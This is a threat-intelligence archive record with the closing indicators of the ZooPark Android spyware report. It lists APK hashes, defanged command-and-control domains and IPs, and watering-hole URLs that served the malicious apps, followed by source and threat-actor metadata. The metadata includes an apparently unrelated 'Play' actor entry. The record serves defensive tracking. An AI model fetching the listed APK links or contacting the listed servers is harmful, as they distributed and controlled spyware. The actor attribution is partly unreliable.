3.0||\n|7D7AD116E6A42D4E518378E2313E9392|Sexy_wallpaper.apk|\n|A7D00C8629079F944B61C4DD5C77C8FB|ArabicRSS.apk|\n|AC4402E04DE0949D7BEED975DB84E594|com.ann.newspaper.apk|\n|B714B092D2F28FCF78EF8D02B46DBF9C|Alnaharegypt.news_v2.0.apk familyinnovation_app.apk|\n|Version 4.0||\n|519018ECFC50C0CF6CD0C88CC41B2A69|FirewallFA.apk|\n|5AD36F6DD060E52771A8E4A1DD90C50C|DVPNEasy.apk|\n|B44B91B14F176FBF93D998141931A4AA|DeleteTelegram.apk|\n\n\n-----\n\n### C2 servers\n\nentekhab10[.]xp3[.]biz\n\nandroidupdaters[.]com\n\ndlgmail[.]com\n\nrhubarb2[.]com\n\nrhubarb3[.]com\n\n5.61.27[.]154\n\n5.61.27[.]157\n\n### Watering holes\n\nhxxp://www.alnaharegypt[.]com/t~467369 ->\nhxxp://showroommontorgueil[.]com/modules/homepageadvertise2/slides/alnaharegypt.news\n_v2.0[.]apk\n\nhxxp://www.alhayatnews[.]com/ArabicRSS[.]apk\n\n###### 36\nWho’s who in the Zoo Cyberespionage operation targets\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.05.03.whos-who-in-the-zoo/ZooPark_for_public_final_edit.pdf",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/05/03114450/ZooPark_for_public_final_edit.pdf"
    ],
    "report_names": [
        "ZooPark_for_public_final_edit",
        "ZooPark_for_public_final_edit.pdf"
    ],
    "threat_actors": [
        {
            "id": "93edf98a-03c1-48b3-a94c-e1bddc24f0e6",
            "created_at": "2022-10-25T16:07:24.435275Z",
            "updated_at": "2025-03-27T02:02:10.223058Z",
            "deleted_at": null,
            "main_name": "ZooPark",
            "aliases": [
                "APT-C-38",
                "Cobalt Juno",
                "Saber Lion",
                "TG-2884"
            ],
            "source_name": "ETDA:ZooPark",
            "tools": [
                "ZooPark"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c97cf0c1-7f0d-4e35-9bb9-bceaad178c3d",
            "created_at": "2023-01-06T13:46:38.760807Z",
            "updated_at": "2025-03-27T02:00:02.911454Z",
            "deleted_at": null,
            "main_name": "ZooPark",
            "aliases": [],
            "source_name": "MISPGALAXY:ZooPark",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1525357823,
    "ts_modification_date": 1525357831,
    "files": {
        "pdf": "https://archive.orkl.eu/8a8e334f804ece05996db6dbe8c055991cca013e.pdf",
        "text": "https://archive.orkl.eu/8a8e334f804ece05996db6dbe8c055991cca013e.txt",
        "img": "https://archive.orkl.eu/8a8e334f804ece05996db6dbe8c055991cca013e.jpg"
    }
}